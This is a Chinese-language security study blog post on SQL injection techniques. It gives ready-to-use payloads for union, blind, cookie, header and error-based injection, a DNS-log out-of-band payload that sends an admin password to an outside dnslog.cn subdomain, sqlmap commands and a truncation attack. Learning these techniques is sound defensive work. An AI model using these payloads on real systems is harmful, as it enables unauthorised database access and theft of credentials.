---
title: sql注入
date: 2022-04-10 16:26:17
categories:
- security
tags:
- sql注入
toc: true
---
**摘要：本文介绍了sql注入**
<!-- more -->
---
# 零.sql
## 1.常用语法
mysql和sql server都是最常用的数据库语言，虽然语法不同但特别相似。其中mysql是开源的，sql server是微软开发的。
```
limit m,n # 查询m+1行的n条数据。 m+1行开始查询多少条？如limit 0,1
group_concat #多行数据用一行显示
```
## 2.information_schema
库：information_schema 是Mysql数据库里面一个自带的库的库名，存储着你所有的数据库名、表名和列名。
表：schemata,tables，columns;schemata存库名，tables存放都是表名，columns都是列名
列：table_name(存储的表名)， table_schema（存储的是库名），column_name（存储的是列名）
## 3.注释
mysql的两种注释：
```c
-- abc   //abc不会被识别，注意--后有空格，但打空格会被自动取消掉，可以打空格的url编码%20或+
#abc    //GET型不能打#,要打#的url编码%23
```

# 一、sql注入
## 1.什么是sql注入
用户在网页输入的内容被浏览器当做数据库语句进行执行。
原因是服务端在接收来自客户端的查询参数后，未对查询参数进行严格的过滤。导致恶意用户可在查询参数中插入恶意的sql语句来查询数据库中的敏感信息，最终造成数据库信息泄露。这也是安全防护的方法

## 2.注入分类
### 显错注入/联合注入
基本流程
1.判断网站是否存在数据库注入漏洞
	and 1=2  网页没有内容  => 这个网站存在数据库注入漏洞。
原因：我们输入的数据库语句被网站代入到他的数据库中执行了。
2.判断字段（列）数， order by  ，作用是排序。 
	order by 3 --> 页面没有内容，说明网站的那个表没有3列
3.查看回显点： union ，作用是联合查询，能够同时执行两条数据库查询语句。
注意：必须保证两条数据库查询语句查询的表的列数一致。
回显点：如修改select 1,2中的2，页面内容发生变化，则第二列为回显点。
4.查询相关内容
    and 1=2 union select 1,2
    and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 
    and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='zdafiilhhc' limit 0,1 
    and 1=2 union select 1,列名 from 表名 limit 0,1


### 盲注
#### (1)布尔注入
盲注和显错注入的区别就是没有回显点。即我们要通过判断的方式，去查询
```
length(database()) # 查询的是【当前数据库库名】的长度。
length(database())=2  --> 无查询数据 --> 当前数据库的库名不是2个字符
substr('cmd',1,1) #  --> 截取的是 c 
substr(database(),1,1)  # 截取【当前数据库库名】的第一个字符。
and substr(database(),1,1)='a' --> 页面无内容--> 说明当前数据库库名第一个字符不是a
and substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) = 'a' --> 第一个字符不是a
```
#### (2)时间注入
```
if(length(database())=12,sleep(5),1) --> 网站延迟显示5秒，说明判断条件是对的-->当前数据库库明的长度是12
```
### cookie注入
当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。
默认浏览器是会URL编码的。  空格--> %20
如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)
`b9a2a2b5dffb918c -> md5解码-> welcome`
```
escape() # 函数，作用：进行URL编码
document.cookie = "id=" + escape("171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin")
```

### head注入
HEAD注入条件是知道用户名密码或登录状态

网络中web访问是以IP数据包形式传输数据，每个数据包由头部（head）和数据体（body）组成，head中有访问者的各种信息。

有的网站他会为了保存我们的信息作为比对会把head头中的信息保存到数据库中以便下一次使用。通讯时我们若能抓到请求数据包，并将头部中身份信息修改则为HEAD注入。抓包实例如下（使用burp）

就像图中User-Agent本意是表示你是哪种访问方式例如苹果、微软、安卓、华为等等，图中我把他的值更换为了一个注入语句，并报错就返回了我关心的结果。

```
updataxml或extractvalue #报错函数 head注入是通过引起报错，来返回需要的信息，所以不需要回显点
concat
```
下面详细讲解UPDATEXML (XML_document, XPath_string, new_value);
```
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串)<--有特定要求格式
第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变XML_document文档中符合XPATH_string的值
```
注入语句为
```
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```
其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误`ERROR 1105 (HY000): XPATH syntax error: '得到的数据'`
### 报错注入
任何能引起数据库报错的输入，如引号

![3](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs3.png)

```bash
试下' and 1=1111,看报错信息
'aandnd updatexml(1,concat(0x21,@@version,0x21),1)-- q#能让数据伴随报错一起显示
0x21->!的编码 能让我们更快地识别出信息
```
### DNS_LOG注入
利用DNS解析然后配合日志记录，将数据库里面的数据oob：out of bind  数据外带。。
特点：能够将盲注变成显错注入。
[DNS解析记录的日志网站](http://www.dnslog.cn/),作用：可以申请一个域名，然后会记录下任何访问了这个域名和子域名的IP
```bash
fefaad.dnslog.cn #有记录。
database.fefaad.dnslog.cn   #子域名也有记录
```
```bash
load_file() # 作用是：读文件
concat() #  作用是 拼接字符串
select load_file() #读取文件内容

select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))
select load_file(concat('//',(select password from admin limit 0,1),'.qtm0xb.dnslog.cn/1.txt'))
```
如图，发现没有回显点后，先输入and (),要执行括号里的语句:`select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))`注意一定要带一个文件，文件是什么无所谓，但loadfile是读取文件的，必须在mysql命令里写一个文件名上去。

# 二、bypass
# 三、sqlmap
```bash
sqlmap -u ""  #kali用法
sqlmap -u "" -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-u
sqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包
–force-ssl #https。或者可以在Host头后面加上端口443。
```

# 四、sql约束攻击
新建表格名字为user，该表的约束的是名字和密码长度不能超过10
插入长度大于10的用户名，查看插入的数据，发现只保留了十个字符
再插入一条加空格的用户名，发现和不加空格插入的admin一样
![20220607014904](https://s2.loli.net/2022/06/07/5njeMs9m2LXqVrv.png)
可实现admin的重复注册和插入数据库